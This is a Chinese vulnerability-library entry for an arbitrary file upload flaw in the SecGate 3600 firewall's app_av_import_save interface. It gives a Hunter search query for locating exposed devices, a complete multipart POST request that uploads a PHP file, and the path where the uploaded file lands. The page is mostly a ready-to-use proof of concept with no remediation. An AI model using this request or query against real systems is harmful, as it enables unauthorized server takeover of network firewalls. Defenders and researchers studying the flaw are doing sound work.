# 网神SecGata 3600防火墙app_av_import_save任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">网神 SecGate 3600 防火墙 app_av_import_save接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 网神SecGata 3600防火墙

# 三、资产测绘
    - hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"`


+ 登录页面


# 四、漏洞复现
```plain
POST / HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 451
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile";filename="nhzwe1.php"
Content-Type: text/plain

<?php echo(md5(13123));unlink(__FILE__);?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

app_av_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```


上传文件位置

```plain
/attachements/nhzwe1.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uay6pavy9qt2qc29>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
